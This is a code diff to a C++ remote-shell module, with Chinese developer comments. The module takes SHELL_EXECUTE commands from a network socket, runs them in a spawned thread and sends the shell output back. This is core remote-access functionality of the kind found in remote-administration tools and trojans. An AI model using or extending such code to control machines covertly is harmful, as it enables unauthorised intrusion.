@@ -20,21 +20,16 @@ void CModuleShellRemote::OnRecvivePacket(CPacket* pPacket) {
 
 	switch (pPacketCopy->m_PacketHead.wCommandId) {
 		
-	case SHELL_EXECUTE: {
-		//MessageBox(0, (WCHAR*)pPacket->m_pbPacketBody, L"", 0);
-		
-		//ExecuteShell((WCHAR*)pPacket->m_pbPacketBody);			// 能拿到运行结果，但是包就是发不出去。。。。// 但是注释此行，运行下面两行的，这个包能发出去。
+	case SHELL_EXECUTE: 
 
 		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ExecuteShell, (LPVOID)pPacketCopy, 0, NULL);
-		// 最终发现，创建个子线程运行ExecuteShell函数就能发包了。我猜测应该也和OnReceive回调中不要绘制对话框一个原因，因为ExecuteShell函数内有ReadFile,有管道交互等大量IO操作。
+		// 最终发现，创建个子线程运行ExecuteShell函数就能发包了。我猜测应该也和OnReceive回调中
+		// 不要绘制对话框一个原因，因为ExecuteShell函数内有ReadFile,有管道交互等大量IO操作。
 
-		//WCHAR pszData[30] = L"I am the test!";
-		//pPacket->m_pSocketClient->SendPacket(SHELL_EXECUTE, (PBYTE)pszData, 30);
 		break;
-	}
-		
 
 	case SHELL_CLOSE:
+		m_pChildSocketClient->SendPacket(SHELL_CLOSE, NULL, 0);
 		break;
 	}
 }
@@ -119,7 +114,7 @@ DWORD WINAPI ExecuteShell(LPVOID lParam)
 				printf("%c", SendBuf[i]);
 			}*/
 			BOOL bRet = m_pChildSocketClient->SendPacket(SHELL_EXECUTE, (PBYTE)SendBuf, bytesRead);
-			printf("???!!!!!!%d\n", m_pChildSocketClient->m_pTcpPackClient->IsConnected());
+			//printf("???!!!!!!%d\n", m_pChildSocketClient->m_pTcpPackClient->IsConnected());
 		}
 
 		memset(SendBuf, 0, sizeof(SendBuf));  //缓冲清零
